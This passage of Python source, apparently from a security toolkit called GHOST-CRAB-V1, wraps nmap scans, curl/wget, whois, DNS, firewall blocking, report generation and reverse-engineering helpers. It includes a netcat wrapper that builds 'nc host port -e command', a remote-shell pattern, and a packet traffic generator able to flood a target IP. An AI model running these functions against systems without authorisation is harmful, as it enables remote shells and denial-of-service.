            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        """Traceroute to a target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick", options: str = "") -> CommandResult:
        """Run nmap scan"""
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "aggressive": ['nmap', '-A', '-T4', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target],
                "snmp": ['nmap', '-sU', '-p', '161', '--script', 'snmp-*', target],
                "smb": ['nmap', '-p', '445', '--script', 'smb-*', target],
                "ssh": ['nmap', '-p', '22', '--script', 'ssh-*', target],
                "ftp": ['nmap', '-p', '21', '--script', 'ftp-*', target],
                "smtp": ['nmap', '-p', '25', '--script', 'smtp-*', target],
                "dns": ['nmap', '-p', '53', '--script', 'dns-*', target],
                "http": ['nmap', '-p', '80', '--script', 'http-*', target],
                "https": ['nmap', '-p', '443', '--script', 'http-*', target],
                "mysql": ['nmap', '-p', '3306', '--script', 'mysql-*', target],
                "mssql": ['nmap', '-p', '1433', '--script', 'ms-sql-*', target],
                "oracle": ['nmap', '-p', '1521', '--script', 'oracle-*', target],
                "postgres": ['nmap', '-p', '5432', '--script', 'pgsql-*', target],
                "rdp": ['nmap', '-p', '3389', '--script', 'rdp-*', target],
                "vnc": ['nmap', '-p', '5900', '--script', 'vnc-*', target],
                "telnet": ['nmap', '-p', '23', '--script', 'telnet-*', target]
            }
            
            if scan_type == "custom" and options:
                cmd = ['nmap'] + options.split() + [target]
            else:
                cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None, 
             headers: Dict = None, options: str = "") -> CommandResult:
        """Execute curl request"""
        start_time = time.time()
        try:
            cmd = ['curl', '-s']
            
            if method.upper() != "GET":
                cmd.extend(['-X', method.upper()])
            
            if data:
                cmd.extend(['-d', data])
            
            if headers:
                for key, value in headers.items():
                    cmd.extend(['-H', f'{key}: {value}'])
            
            if options:
                cmd.extend(options.split())
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None, options: str = "") -> CommandResult:
        """Execute wget download"""
        start_time = time.time()
        try:
            cmd = ['wget', '-q']
            
            if output:
                cmd.extend(['-O', output])
            
            if options:
                cmd.extend(options.split())
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        """Execute netcat"""
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        """WHOIS lookup"""
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        """DNS lookup"""
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_public_ip() -> Optional[str]:
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        return None
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        """Block IP via firewall"""
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=GHOST_CRAB_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        """Unblock IP via firewall"""
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=GHOST_CRAB_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        """Convert IP to domain name"""
        try:
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        """Convert domain to IP address"""
        try:
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            if DNS_AVAILABLE:
                try:
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None
    
    @staticmethod
    def get_mac_vendor(mac: str) -> Optional[str]:
        """Get MAC address vendor"""
        try:
            mac = mac.upper().replace('-', ':').replace('.', ':')
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None

# =====================
# REPORT GENERATOR
# =====================
class ReportGenerator:
    """Generates PDF and JSON reports"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def generate_pdf_report(self, analysis_data: Dict, target: str) -> Optional[str]:
        """Generate PDF report from analysis data"""
        try:
            if not PDF_AVAILABLE:
                logger.error("PDF generation not available (reportlab missing)")
                return None
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_filename = f"ghost_crab_report_{target}_{timestamp}.pdf"
            report_path = os.path.join(PDF_REPORTS_DIR, report_filename)
            
            doc = SimpleDocTemplate(
                report_path,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=pdf_colors.HexColor('#8B0000'),
                alignment=0,
                spaceAfter=30
            )
            
            story = []
            
            # Header
            story.append(Paragraph(f"GHOST-CRAB-V1 Security Report", title_style))
            story.append(Spacer(1, 12))
            
            # Metadata table
            metadata = [
                ['Title:', f"Security Analysis Report"],
                ['Target:', target],
                ['Generated:', datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
                ['Tool:', f"GHOST-CRAB-V1 v{VERSION}"],
                ['Author:', AUTHOR]
            ]
            
            meta_table = Table(metadata, colWidths=[100, 400])
            meta_table.setStyle(TableStyle([
                ('FONTNAME', (0, 0), (-1, -1), 'Courier'),
                ('FONTSIZE', (0, 0), (-1, -1), 10),
                ('TEXTCOLOR', (0, 0), (0, -1), pdf_colors.grey),
                ('TEXTCOLOR', (1, 0), (1, -1), pdf_colors.black),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
            ]))
            story.append(meta_table)
            story.append(Spacer(1, 20))
            
            # Executive Summary
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary = f"""This report presents a comprehensive security analysis of <b>{target}</b>. 
            The assessment was performed using GHOST-CRAB-V1's automated scanning and threat monitoring capabilities.
            The findings below highlight potential security issues and provide recommendations for remediation."""
            story.append(Paragraph(summary, styles['Normal']))
            story.append(Spacer(1, 15))
            
            # Analysis Sections
            for key, value in analysis_data.items():
                if isinstance(value, dict):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for sub_key, sub_value in value.items():
                        if not isinstance(sub_value, (dict, list)):
                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
                    story.append(Spacer(1, 10))
                elif isinstance(value, list):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for item in value[:20]:
                        if isinstance(item, dict):
                            item_text = ', '.join([f"{k}: {v}" for k, v in item.items() if not isinstance(v, (dict, list))])
                            story.append(Paragraph(f"• {item_text}", styles['Normal']))
                        else:
                            story.append(Paragraph(f"• {item}", styles['Normal']))
                    story.append(Spacer(1, 10))
                else:
                    story.append(Paragraph(f"{key.replace('_', ' ').title()}: {value}", styles['Normal']))
            
            # Recommendations
            if 'recommendations' in analysis_data:
                story.append(Paragraph("Recommendations", styles['Heading2']))
                for rec in analysis_data['recommendations']:
                    story.append(Paragraph(f"• {rec}", styles['Normal']))
                story.append(Spacer(1, 15))
            
            # Footer
            story.append(Spacer(1, 30))
            story.append(Paragraph(
                f"Report generated by GHOST-CRAB-V1 v{VERSION} | {AUTHOR} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                styles['Italic']
            ))
            
            doc.build(story)
            
            report = PDFReport(
                title=f"Security Analysis Report - {target}",
                target=target,
                analysis=analysis_data,
                timestamp=datetime.now().isoformat(),
                file_path=report_path,
                status="generated"
            )
            self.db.save_pdf_report(report)
            
            logger.info(f"PDF report generated: {report_path}")
            return report_path
            
        except Exception as e:
            logger.error(f"PDF generation error: {e}")
            return None
    
    def generate_json_report(self, analysis_data: Dict, target: str) -> Optional[str]:
        """Generate JSON report from analysis data"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_filename = f"ghost_crab_report_{target}_{timestamp}.json"
            report_path = os.path.join(REPORT_DIR, report_filename)
            
            report_data = {
                'tool': NAME,
                'version': VERSION,
                'author': AUTHOR,
                'target': target,
                'timestamp': datetime.now().isoformat(),
                'analysis': analysis_data
            }
            
            with open(report_path, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            logger.info(f"JSON report generated: {report_path}")
            return report_path
        except Exception as e:
            logger.error(f"JSON report generation error: {e}")
            return None
    
    def generate_report(self, analysis_data: Dict, target: str) -> Dict[str, str]:
        """Generate both PDF and JSON reports"""
        reports = {}
        
        pdf_path = self.generate_pdf_report(analysis_data, target)
        if pdf_path:
            reports['pdf'] = pdf_path
        
        json_path = self.generate_json_report(analysis_data, target)
        if json_path:
            reports['json'] = json_path
        
        return reports
    
    def generate_charts(self, data: Dict, chart_type: str = 'bar') -> Optional[str]:
        """Generate bar or pie charts from data"""
        try:
            if not GRAPHICS_AVAILABLE:
                logger.error("Graphics not available (matplotlib missing)")
                return None
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            chart_filename = f"chart_{timestamp}.png"
            chart_path = os.path.join(GRAPHICS_DIR, chart_filename)
            
            fig, ax = plt.subplots(figsize=(10, 6))
            
            if chart_type == 'bar':
                labels = list(data.keys())
                values = list(data.values())
                colors = ['#8B0000', '#FF0000', '#FF4500', '#FF6347', '#FF7F50']
                bars = ax.bar(labels, values, color=colors[:len(labels)])
                ax.set_xlabel('Categories')
                ax.set_ylabel('Values')
                ax.set_title('GHOST-CRAB-V1 Analysis')
                
                # Add value labels on bars
                for bar, value in zip(bars, values):
                    height = bar.get_height()
                    ax.text(bar.get_x() + bar.get_width()/2., height,
                           f'{value}', ha='center', va='bottom')
            elif chart_type == 'pie':
                labels = list(data.keys())
                values = list(data.values())
                colors = ['#8B0000', '#FF0000', '#FF4500', '#FF6347', '#FF7F50']
                ax.pie(values, labels=labels, colors=colors[:len(labels)], 
                      autopct='%1.1f%%', startangle=90)
                ax.set_title('GHOST-CRAB-V1 Distribution')
            
            ax.set_facecolor('#1a1a1a')
            fig.patch.set_facecolor('#0a0a0a')
            ax.tick_params(colors='white')
            ax.xaxis.label.set_color('white')
            ax.yaxis.label.set_color('white')
            ax.title.set_color('#FF0000')
            
            plt.tight_layout()
            plt.savefig(chart_path, dpi=100, facecolor='#0a0a0a')
            plt.close()
            
            logger.info(f"Chart generated: {chart_path}")
            return chart_path
        except Exception as e:
            logger.error(f"Chart generation error: {e}")
            return None

# =====================
# REVERSE ENGINEERING TOOLS
# =====================
class ReverseEngineeringTools:
    """Reverse engineering utilities"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.ghidra_path = config.get('reverse_engineering.ghidra_path', '')
        self.radare2_path = config.get('reverse_engineering.radare2_path', shutil.which('r2') or '')
        self.strings_min_length = config.get('reverse_engineering.strings_min_length', 4)
    
    def extract_strings(self, file_path: str, min_length: int = None) -> str:
        """Extract strings from a binary file"""
        min_length = min_length or self.strings_min_length
        job_id = str(uuid.uuid4())[:8]
        
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Extract ASCII strings
            ascii_strings = re.findall(rb'[ -~]{%d,}' % min_length, data)
            ascii_strings = [s.decode('ascii', errors='ignore') for s in ascii_strings]
            
            # Extract Unicode strings
            unicode_strings = re.findall(rb'(?:[\x20-\x7e]\x00){%d,}' % min_length, data)
            unicode_strings = [s.decode('utf-16-le', errors='ignore') for s in unicode_strings]
            
            result = "=== ASCII Strings ===\n"
            result += "\n".join(ascii_strings[:500])
            result += "\n\n=== Unicode Strings ===\n"
            result += "\n".join(unicode_strings[:500])
            
            self.db.save_re_job(job_id, file_path, 'strings', result)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"strings_{job_id}.txt")
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def hex_dump(self, file_path: str, offset: int = 0, length: int = 256) -> str:
        """Generate hex dump of a file"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            with open(file_path, 'rb') as f:
                f.seek(offset)
                data = f.read(length)
            
            result = f"Hex dump of {file_path} (offset: {offset}, length: {length}):\n"
            result += "=" * 70 + "\n"
            
            for i in range(0, len(data), 16):
                chunk = data[i:i+16]
                hex_part = ' '.join(f'{b:02x}' for b in chunk)
                ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                result += f"{offset + i:08x}  {hex_part:<48}  {ascii_part}\n"
            
            self.db.save_re_job(job_id, file_path, 'hexdump', result)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"hexdump_{job_id}.txt")
            with open(output_path, 'w') as f:
                f.write(result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def disassemble(self, file_path: str) -> str:
        """Disassemble a binary using radare2 or objdump"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            # Try radare2 first
            if self.radare2_path and shutil.which(self.radare2_path):
                cmd = [self.radare2_path, '-q', '-c', 'aa; pdf', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    output = result.stdout
                else:
                    output = result.stderr
            # Try objdump
            elif shutil.which('objdump'):
                cmd = ['objdump', '-d', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                output = result.stdout if result.returncode == 0 else result.stderr
            # Try gdb
            elif shutil.which('gdb'):
                cmd = ['gdb', '-batch', '-ex', 'disassemble', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                output = result.stdout if result.returncode == 0 else result.stderr
            else:
                output = "No disassembler available. Install radare2, objdump, or gdb."
            
            self.db.save_re_job(job_id, file_path, 'disassemble', output)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"disasm_{job_id}.txt")
            with open(output_path, 'w') as f:
                f.write(output)
            
            return output
        except Exception as e:
            return f"Error: {e}"
    
    def decompile(self, file_path: str) -> str:
        """Decompile a binary using available tools"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            # Try radare2
            if self.radare2_path and shutil.which(self.radare2_path):
                cmd = [self.radare2_path, '-q', '-c', 'aaa; pdc', file_path]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                output = result.stdout if result.returncode == 0 else result.stderr
            else:
                output = "No decompiler available. Install radare2 with decompiler plugins."
            
            self.db.save_re_job(job_id, file_path, 'decompile', output)
            
            output_path = os.path.join(REVERSE_ENGINEERING_DIR, f"decompiled_{job_id}.txt")
            with open(output_path, 'w') as f:
                f.write(output)
            
            return output
        except Exception as e:
            return f"Error: {e}"
    
    def decode_obfuscated(self, data: str, encoding: str = 'base64') -> str:
        """Decode obfuscated data"""
        try:
            if encoding.lower() == 'base64':
                return base64.b64decode(data).decode('utf-8', errors='ignore')
            elif encoding.lower() == 'hex':
                return bytes.fromhex(data).decode('utf-8', errors='ignore')
            elif encoding.lower() == 'rot13':
                return codecs.decode(data, 'rot_13')
            elif encoding.lower() == 'url':
                return urllib.parse.unquote(data)
            elif encoding.lower() == 'gzip':
                return gzip.decompress(base64.b64decode(data)).decode('utf-8', errors='ignore')
            elif encoding.lower() == 'zlib':
                return zlib.decompress(base64.b64decode(data)).decode('utf-8', errors='ignore')
            else:
                return f"Unsupported encoding: {encoding}"
        except Exception as e:
            return f"Error: {e}"
    
    def analyze_metadata(self, file_path: str) -> str:
        """Analyze file metadata"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            result = f"File Analysis: {file_path}\n"
            result += "=" * 50 + "\n"
            
            # File info
            stat = os.stat(file_path)
            result += f"Size: {stat.st_size} bytes\n"
            result += f"Created: {datetime.fromtimestamp(stat.st_ctime)}\n"
            result += f"Modified: {datetime.fromtimestamp(stat.st_mtime)}\n"
            result += f"Permissions: {oct(stat.st_mode)[-3:]}\n"
            
            # Check magic bytes
            with open(file_path, 'rb') as f:
                magic = f.read(4)
            
            magic_hex = binascii.hexlify(magic).decode()
            result += f"Magic bytes: {magic_hex}\n"
            
            # Determine file type
            file_types = {
                b'\x7fELF': 'ELF executable',
                b'MZ': 'PE executable (Windows)',
                b'PK\x03\x04': 'ZIP archive',
                b'\x1f\x8b': 'GZIP archive',
                b'%PDF': 'PDF document',
                b'\xff\xd8\xff': 'JPEG image',
                b'\x89PNG': 'PNG image',
                b'GIF8': 'GIF image',
                b'BZh': 'BZIP2 archive',
                b'\xfd7zXZ': 'XZ archive',
            }
            
            detected_type = 'Unknown'
            for sig, name in file_types.items():
                if magic.startswith(sig):
                    detected_type = name
                    break
            
            result += f"Detected type: {detected_type}\n"
            
            # Calculate hashes
            result += "\nHashes:\n"
            with open(file_path, 'rb') as f:
                data = f.read()
            result += f"  MD5: {hashlib.md5(data).hexdigest()}\n"
            result += f"  SHA1: {hashlib.sha1(data).hexdigest()}\n"
            result += f"  SHA256: {hashlib.sha256(data).hexdigest()}\n"
            
            self.db.save_re_job(job_id, file_path, 'metadata', result)
            
            return result
        except Exception as e:
            return f"Error: {e}"
    
    def extract_embedded(self, file_path: str) -> str:
        """Extract embedded files from archives"""
        job_id = str(uuid.uuid4())[:8]
        
        try:
            result = f"Extracting embedded files from: {file_path}\n"
            extract_dir = os.path.join(REVERSE_ENGINEERING_DIR, f"extract_{job_id}")
            os.makedirs(extract_dir, exist_ok=True)
            
            if zipfile.is_zipfile(file_path):
                with zipfile.ZipFile(file_path, 'r') as z:
                    z.extractall(extract_dir)
                    result += f"Extracted {len(z.namelist())} files from ZIP archive\n"
                    result += "\n".join(z.namelist())
            elif tarfile.is_tarfile(file_path):
                with tarfile.open(file_path, 'r') as t:
                    t.extractall(extract_dir)
                    result += f"Extracted {len(t.getnames())} files from TAR archive\n"
                    result += "\n".join(t.getnames())
            elif file_path.endswith('.gz'):
                with gzip.open(file_path, 'rb') as f_in:
                    output_path = os.path.join(extract_dir, os.path.basename(file_path).replace('.gz', ''))
                    with open(output_path, 'wb') as f_out:
                        shutil.copyfileobj(f_in, f_out)
                    result += f"Decompressed to: {output_path}\n"
            elif file_path.endswith('.bz2'):
                with bz2.open(file_path, 'rb') as f_in:
                    output_path = os.path.join(extract_dir, os.path.basename(file_path).replace('.bz2', ''))
                    with open(output_path, 'wb') as f_out:
                        shutil.copyfileobj(f_in, f_out)
                    result += f"Decompressed to: {output_path}\n"
            elif file_path.endswith('.xz'):
                with lzma.open(file_path, 'rb') as f_in:
                    output_path = os.path.join(extract_dir, os.path.basename(file_path).replace('.xz', ''))
                    with open(output_path, 'wb') as f_out:
                        shutil.copyfileobj(f_in, f_out)
                    result += f"Decompressed to: {output_path}\n"
            else:
                result += "No supported archive format detected.\n"
            
            self.db.save_re_job(job_id, file_path, 'extract', result)
            
            return result
        except Exception as e:
            return f"Error: {e}"

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    """Traffic generation engine"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        """Get available traffic types"""
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        """Generate traffic"""
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        """Run traffic generator"""
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        """Get traffic generator function"""
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'tcp_fin': self._tcp_fin,
            'tcp_rst': self._tcp_rst,
            'tcp_psh': self._tcp_psh,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random,
            'xmas': self._xmas,
            'null': self._null,
            'fin_scan': self._fin_scan
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        """Send ICMP packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        """Send TCP SYN packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        """Send TCP ACK packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        """TCP connect"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _tcp_fin(self, target: str, port: int) -> int:
        """Send TCP FIN packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="F")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_rst(self, target: str, port: int) -> int:
        """Send TCP RST packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="R")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_psh(self, target: str, port: int) -> int:
        """Send TCP PSH packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="P")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        """Send UDP packets"""
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"GHOST_CRAB"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"GHOST_CRAB", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        """HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "GHOST-CRAB-V1"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        """HTTP POST request"""
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "GHOST-CRAB-V1"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        """HTTPS request"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
